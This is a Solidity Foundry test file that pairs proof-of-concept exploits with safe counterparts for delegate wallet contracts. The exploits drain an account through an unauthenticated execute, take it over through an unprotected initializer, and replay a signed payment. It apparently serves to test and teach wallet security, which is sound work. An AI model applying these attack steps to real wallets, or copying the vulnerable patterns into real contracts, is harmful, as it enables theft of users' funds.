// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {SafeDelegate} from "../src/SafeDelegate.sol";
import {UnsafeInitDelegate} from "../src/UnsafeInitDelegate.sol";
import {OpenExecuteDelegate} from "../src/OpenExecuteDelegate.sol";
import {ReplayableDelegate} from "../src/ReplayableDelegate.sol";

contract FixturesTest is Test {
    uint256 internal alicePk = 0xA11CE;
    address internal alice; // the victim EOA that delegates
    address internal attacker;
    address internal recipient;

    function setUp() public {
        alice = vm.addr(alicePk);
        attacker = makeAddr("attacker");
        recipient = makeAddr("recipient");
    }

    // ---------- DL-002: unauthenticated execute ----------

    function test_ExploitB_OpenExecuteDrainsAccount() public {
        OpenExecuteDelegate impl = new OpenExecuteDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk); // alice delegates to impl
        vm.deal(alice, 10 ether);

        // Attacker calls alice's EOA and makes it pay itself out. No signature needed.
        vm.prank(attacker);
        OpenExecuteDelegate(payable(alice)).execute(attacker, 10 ether, "");

        assertEq(alice.balance, 0);
        assertEq(attacker.balance, 10 ether); // full takeover of funds
    }

    function test_SafeRejectsUnauthenticatedExecute() public {
        SafeDelegate impl = new SafeDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);
        vm.deal(alice, 10 ether);

        // No valid signature => the safe contract refuses.
        vm.prank(attacker);
        vm.expectRevert();
        SafeDelegate(payable(alice)).execute(
            attacker,
            10 ether,
            "",
            block.timestamp + 1 hours,
            27,
            bytes32(0),
            bytes32(0)
        );

        assertEq(alice.balance, 10 ether); // funds untouched
    }

    // ---------- DL-001: unsafe initializer ----------

    function test_ExploitA_UnsafeInitTakeover() public {
        UnsafeInitDelegate impl = new UnsafeInitDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);
        vm.deal(alice, 5 ether);

        // Attacker initializes alice's account, seizing ownership...
        vm.prank(attacker);
        UnsafeInitDelegate(payable(alice)).initialize(attacker);
        assertEq(UnsafeInitDelegate(payable(alice)).owner(), attacker);

        // ...then sweeps everything.
        vm.prank(attacker);
        UnsafeInitDelegate(payable(alice)).sweep(attacker);
        assertEq(alice.balance, 0);
        assertEq(attacker.balance, 5 ether);
    }

    function test_SafeRejectsForeignInitialize() public {
        SafeDelegate impl = new SafeDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);

        vm.prank(attacker);
        vm.expectRevert(); // "only self"
        SafeDelegate(payable(alice)).initialize(attacker);
    }

    // ---------- DL-003: replayable signed execution ----------

    function test_ExploitC_ReplaySignedExecution() public {
        ReplayableDelegate impl = new ReplayableDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);
        vm.deal(alice, 10 ether);

        uint256 amount = 1 ether;
        bytes32 digest = keccak256(
            abi.encode(recipient, amount, keccak256(bytes("")))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, digest);

        // Alice authorized ONE payment...
        vm.prank(attacker);
        ReplayableDelegate(payable(alice)).execute(
            recipient,
            amount,
            "",
            v,
            r,
            s
        );
        // ...but the same signature is replayed to pay AGAIN.
        vm.prank(attacker);
        ReplayableDelegate(payable(alice)).execute(
            recipient,
            amount,
            "",
            v,
            r,
            s
        );

        assertEq(recipient.balance, 2 ether); // paid twice from one signature
    }

    function test_SafeReplayProtection() public {
        SafeDelegate impl = new SafeDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);
        vm.deal(alice, 10 ether);
        SafeDelegate wallet = SafeDelegate(payable(alice));

        uint256 amount = 1 ether;
        uint256 deadline = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = _signSafe(
            wallet,
            recipient,
            amount,
            "",
            deadline
        );

        // First use succeeds (this call also applies the delegation).
        vm.prank(attacker);
        wallet.execute(recipient, amount, "", deadline, v, r, s);
        assertEq(recipient.balance, amount);

        // Replaying the SAME signature now fails: nonce advanced -> digest differs -> signer mismatch.
        vm.prank(attacker);
        vm.expectRevert();
        wallet.execute(recipient, amount, "", deadline, v, r, s);
        assertEq(recipient.balance, amount); // still only paid once
    }

    function test_SafeRejectsExpiredDeadline() public {
        SafeDelegate impl = new SafeDelegate();
        vm.signAndAttachDelegation(address(impl), alicePk);
        vm.deal(alice, 10 ether);
        SafeDelegate wallet = SafeDelegate(payable(alice));

        vm.warp(1_000_000);
        uint256 deadline = block.timestamp - 1; // already expired
        (uint8 v, bytes32 r, bytes32 s) = _signSafe(
            wallet,
            recipient,
            1 ether,
            "",
            deadline
        );

        vm.prank(attacker);
        vm.expectRevert(); // "expired"
        wallet.execute(recipient, 1 ether, "", deadline, v, r, s);
    }

    // Helper: builds and signs the SafeDelegate digest exactly as the contract does.
    function _signSafe(
        SafeDelegate wallet,
        address target,
        uint256 value,
        bytes memory data,
        uint256 deadline
    ) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 typehash = keccak256(
            "Execute(address account,uint256 chainId,uint256 nonce,uint256 deadline,address target,uint256 value,bytes data)"
        );
        bytes32 digest = keccak256(
            abi.encode(
                typehash,
                address(wallet), // == alice, the account
                block.chainid,
                wallet.execNonce(), // current nonce from the account's storage
                deadline,
                target,
                value,
                keccak256(data)
            )
        );
        (v, r, s) = vm.sign(alicePk, digest);
    }
}
